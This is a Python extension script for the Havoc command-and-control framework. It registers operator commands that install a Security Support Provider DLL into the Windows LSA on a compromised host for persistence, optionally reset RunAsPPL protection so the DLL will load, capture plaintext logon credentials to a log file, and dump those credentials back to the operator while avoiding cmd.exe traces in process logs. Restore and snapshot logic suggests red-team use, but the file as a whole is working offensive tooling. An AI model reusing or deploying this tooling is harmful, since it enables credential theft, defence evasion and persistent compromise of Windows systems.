from havoc import Demon, RegisterCommand

# NOTE: Packer is NOT exported by the havoc module — it is injected into every
# loaded script's namespace by the client's script loader (same as nanodump.py
# and bofbelt.py, which call bare Packer() with no import). Do not add it to
# the havoc import: that raises ImportError at client startup and the module
# silently fails to register.


SSP_INSTALL_HELP = """sspinstall [/setppl]
    Install the persistent SSP (sspmon2): drops the embedded SSP DLL to
    System32, registers HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security
    Packages = sspmon2, verifies on-disk size, and reports RunAsPPL posture.

Arguments:
    /setppl    (optional) reset RunAsPPL to 0 if hardening raised it — without
               this flag a nonzero PPL is only reported and the SSP will not
               load.

Notes:
    - Requires SYSTEM or an elevated admin token (System32 + HKLM writes).
    - REBOOT REQUIRED: LSA loads registered packages at boot only.
    - After reboot: tasklist /m sspmon2.dll  |  log at C:\\Windows\\Temp\\ssp.log
    - Embedded payload: sspmon2.dll (sha256 66eefc85..., kssp-exact layout).
      WARNING: SSP variants with a NULL SpInitialize slot crash Win11 26200
      at boot (CRITICAL_PROCESS_DIED) — do not swap in arbitrary SSP DLLs.
    - ORIGINAL STATE IS SNAPSHOTTED BEFORE ANY CHANGE (Security Packages
      bytes + RunAsPPL -> C:\\Windows\\Temp\\sst.bin) so sspremove can restore
      it exactly. Re-install never overwrites an existing snapshot.
"""

SSP_REMOVE_HELP = """sspremove [/wipe-log] [/ppl:<n>]
    Uninstall the persistent SSP and RESTORE THE ORIGINAL HOST STATE:
    re-creates the original Lsa\\Security Packages bytes (or deletes the value
    if it was absent) and restores RunAsPPL from the install-time snapshot
    (Temp\\sst.bin), then deletes the DLL and sweeps Temp artifacts.

Arguments:
    /wipe-log    dump ssp.log to console FIRST, then delete it — evidence
                 survives in the task output. Default: keep the log.
    /ppl:<n>     manual RunAsPPL restore (e.g. /ppl:2) — used only when the
                 snapshot file is missing.

Notes:
    - Requires an elevated admin token.
    - The snapshot is consumed (deleted) after a successful restore.
    - Reboot after removal to fully unload the SSP from lsass.
"""

SSP_STATUS_HELP = """sspstatus
    Posture check (read-only): Lsa\\Security Packages value, RunAsPPL,
    System32\\sspmon2.dll presence/size, ssp.log size + capture-line count.
"""

SSP_LOG_HELP = """ssplog
    Dump C:\\Windows\\Temp\\ssp.log to the console (last 64 KiB). Reads via
    the BOF — no cmd.exe/type in the process logs.
"""


def sspinstall(demonID, *params):
    demon = Demon(demonID)
    packer = Packer()
    setppl = False
    for p in params:
        if p == "/setppl":
            setppl = True
            packer.addstr("/setppl")
        else:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Unknown argument: {p}")
            return

    note = " (+ /setppl)" if setppl else ""
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to install persistent SSP{note}")
    demon.InlineExecute(TaskID, "go", f"bin/ssp_install.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


def sspremove(demonID, *params):
    demon = Demon(demonID)
    packer = Packer()
    extras = []
    for p in params:
        if p == "/wipe-log":
            extras.append("/wipe-log")
            packer.addstr("/wipe-log")
        elif p.startswith("/ppl:") and p[5:].isdigit():
            extras.append(p)
            packer.addstr(p)
        else:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Unknown argument: {p}")
            return

    note = " (+ " + " ".join(extras) + ")" if extras else ""
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to uninstall persistent SSP and restore original state{note}")
    demon.InlineExecute(TaskID, "go", f"bin/ssp_remove.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


def sspstatus(demonID, *params):
    demon = Demon(demonID)
    if len(params) > 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "sspstatus takes no arguments")
        return
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to check SSP posture")
    demon.InlineExecute(TaskID, "go", f"bin/ssp_status.{demon.ProcessArch}.o", b"", False)
    return TaskID


def ssplog(demonID, *params):
    demon = Demon(demonID)
    if len(params) > 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "ssplog takes no arguments")
        return
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to dump ssp.log")
    demon.InlineExecute(TaskID, "go", f"bin/ssp_log.{demon.ProcessArch}.o", b"", False)
    return TaskID


RegisterCommand(sspinstall, "", "sspinstall",
    "Install persistent SSP (snapshot state, drop DLL, LSA registry); reboot to load", 0,
    SSP_INSTALL_HELP, "sspinstall /setppl")

RegisterCommand(sspremove, "", "sspremove",
    "Uninstall persistent SSP + restore original state from snapshot", 0,
    SSP_REMOVE_HELP, "sspremove /wipe-log /ppl:2")

RegisterCommand(sspstatus, "", "sspstatus",
    "SSP posture check: registry, DLL, log stats (read-only)", 0,
    SSP_STATUS_HELP, "sspstatus")

RegisterCommand(ssplog, "", "ssplog",
    "Dump ssp.log (captured plaintext logons) via BOF", 0,
    SSP_LOG_HELP, "ssplog")
